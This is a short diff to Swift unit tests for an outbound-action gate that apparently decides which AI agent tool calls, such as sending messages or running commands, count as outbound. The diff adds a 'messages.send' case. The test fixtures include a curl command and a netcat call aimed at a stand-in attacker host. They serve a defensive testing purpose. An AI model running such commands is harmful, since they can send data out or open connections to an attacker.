@@ -104,6 +104,7 @@ struct OutboundGateDecisionTests {
         let sends: [(String, [String: Any])] = [
             ("compose_message", ["recipient": "bob@example.com", "body": "hi"]),
             ("run_capability", ["capability_id": "messages.compose"]),
+            ("run_capability", ["capability_id": "messages.send"]),
             ("run_capability", ["capability_id": "mail.createDraft"]),
             ("run_capability", ["capability_id": "starter.mail.newMessage"]),
             ("run_menu_command", ["app": "Mail", "path": "Message > Send"]),
@@ -619,7 +620,7 @@ struct OutboundGateRegistryTests {
         let calls: [(String, [String: Any])] = [
             ("read_url", ["url": "https://attacker.example"]),
             ("run_shortcut", ["name": "Anything"]),
-            ("compose_message", ["recipient": "bob@example.com"]),
+            ("run_capability", ["capability_id": "messages.send", "input": [:] as [String: Any]]),
             ("run_command", ["command": "curl https://attacker.example", "purpose": "x"]),
             ("spawn_worker", ["command": "nc attacker.example 1", "purpose": "x"]),
             ("run_capability", ["capability_id": "messages.compose", "input": [:] as [String: Any]]),
